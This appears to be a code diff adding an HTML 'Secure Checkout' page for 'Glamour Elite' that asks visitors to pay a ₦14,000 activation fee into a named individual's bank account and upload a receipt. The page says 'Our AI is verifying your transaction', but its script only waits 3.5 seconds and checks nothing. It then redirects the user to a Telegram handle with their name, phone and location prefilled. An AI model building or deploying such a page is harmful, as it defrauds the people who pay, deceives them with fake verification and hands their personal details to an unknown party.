@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Payment | Glamour Elite</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --gold: #F5C24C;
+            --dark-gold: #D4A017;
+            --bg: #0e0e0e;
+        }
+
+        body {
+            background: var(--bg);
+            font-family: 'Poppins', sans-serif;
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .gold-gradient {
+            background: linear-gradient(135deg, #fff5c0, var(--gold), var(--dark-gold));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .payment-card {
+            width: 95%;
+            max-width: 450px;
+            margin: 40px auto;
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(245, 194, 76, 0.15);
+            border-radius: 35px;
+            padding: 30px;
+            backdrop-filter: blur(20px);
+        }
+
+        .account-box {
+            background: rgba(245, 194, 76, 0.05);
+            border: 1px solid rgba(245, 194, 76, 0.1);
+            border-radius: 20px;
+            padding: 20px;
+            position: relative;
+        }
+
+        .copy-badge {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            font-size: 10px;
+            background: var(--gold);
+            color: black;
+            padding: 2px 8px;
+            border-radius: 5px;
+            font-weight: 800;
+            cursor: pointer;
+        }
+
+        .upload-area {
+            border: 2px dashed rgba(245, 194, 76, 0.3);
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .upload-area:hover {
+            background: rgba(245, 194, 76, 0.05);
+            border-color: var(--gold);
+        }
+
+        .loader {
+            border: 3px solid rgba(245, 194, 76, 0.1);
+            border-top: 3px solid var(--gold);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        #processing-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(14, 14, 14, 0.95);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="mt-10 mb-6 text-center">
+        <h1 class="text-2xl font-bold gold-gradient" style="font-family: 'Cinzel', serif;">SECURE CHECKOUT</h1>
+        <p class="text-zinc-500 text-[10px] uppercase tracking-[3px]">Complete Your Activation</p>
+    </div>
+
+    <div class="payment-card">
+        <!-- Account Details -->
+        <div class="text-center mb-6">
+            <p class="text-zinc-400 text-sm">Transfer exactly <span class="text-white font-bold">₦14,000</span> to:</p>
+        </div>
+
+        <div class="account-box mb-8">
+            <div class="mb-4">
+                <p class="text-zinc-500 text-[10px] uppercase font-bold">Bank Name</p>
+                <p class="text-lg font-semibold">78 FINANCE COMPANY LTD</p>
+            </div>
+            
+            <div class="mb-4">
+                <p class="text-zinc-500 text-[10px] uppercase font-bold">Account Number</p>
+                <div class="flex items-center gap-2">
+                    <p class="text-2xl font-black gold-gradient tracking-wider" id="acc-num">9159733430</p>
+                    <span class="copy-badge" onclick="copyText()">COPY</span>
+                </div>
+            </div>
+
+            <div>
+                <p class="text-zinc-500 text-[10px] uppercase font-bold">Account Holder</p>
+                <p class="text-sm font-medium text-white">MIRACLE OLATOYE</p>
+            </div>
+        </div>
+
+        <!-- Receipt Upload -->
+        <div class="mb-6">
+            <p class="text-zinc-400 text-xs mb-3 font-medium"><i class="fas fa-camera mr-2"></i>Upload Payment Receipt</p>
+            <input type="file" id="receipt-upload" accept="image/*" class="hidden" onchange="handleFile(event)">
+            <label for="receipt-upload" class="upload-area block" id="drop-zone">
+                <i class="fas fa-cloud-upload-alt text-3xl text-zinc-600 mb-2"></i>
+                <p class="text-zinc-500 text-xs" id="file-name">Click to select or drop screenshot</p>
+            </label>
+        </div>
+
+        <button onclick="processPayment()" id="pay-btn" class="w-full bg-zinc-800 text-zinc-500 py-4 rounded-xl font-bold uppercase text-sm tracking-widest cursor-not-allowed" disabled>
+            Verify Receipt
+        </button>
+    </div>
+
+    <!-- Processing Overlay -->
+    <div id="processing-overlay">
+        <div class="loader mb-6"></div>
+        <h2 class="text-xl font-bold gold-gradient italic mb-2">Confirming Payment...</h2>
+        <p class="text-zinc-500 text-xs text-center px-10">Our AI is verifying your transaction. Do not close this window.</p>
+    </div>
+
+    <script>
+        // Retrieve registration data from localStorage
+        const userData = JSON.parse(localStorage.getItem('glamour_reg_data')) || {
+            name: "Unknown",
+            user: "Guest",
+            phone: "N/A",
+            location: "N/A"
+        };
+
+        function copyText() {
+            const num = document.getElementById('acc-num').innerText;
+            navigator.clipboard.writeText(num);
+            alert("Account number copied!");
+        }
+
+        function handleFile(event) {
+            const file = event.target.files[0];
+            const btn = document.getElementById('pay-btn');
+            const fileNameDisplay = document.getElementById('file-name');
+            
+            if (file) {
+                fileNameDisplay.innerText = file.name;
+                fileNameDisplay.classList.add('text-green-400');
+                btn.disabled = false;
+                btn.style.background = 'linear-gradient(135deg, #F5C24C, #D4A017)';
+                btn.style.color = 'black';
+                btn.style.cursor = 'pointer';
+            }
+        }
+
+        function processPayment() {
+            document.getElementById('processing-overlay').style.display = 'flex';
+
+            // Simulate verification time (3 seconds)
+            setTimeout(() => {
+                const telegramLink = "https://t.me/Haltimo";
+                
+                // Prefilled message construction
+                const message = `👑 *NEW PAYMENT VERIFIED*%0A%0A` +
+                                `👤 *Name:* ${userData.name}%0A` +
+                                `🆔 *Username:* @${userData.user}%0A` +
+                                `📞 *Phone:* ${userData.phone}%0A` +
+                                `📍 *Location:* ${userData.location}%0A` +
+                                `💰 *Amount:* ₦14,000%0A%0A` +
+                                `Kindly activate my creator portal.`;
+
+                window.location.href = `${telegramLink}?text=${message}`;
+            }, 3500);
+        }
+    </script>
+</body>
+</html>
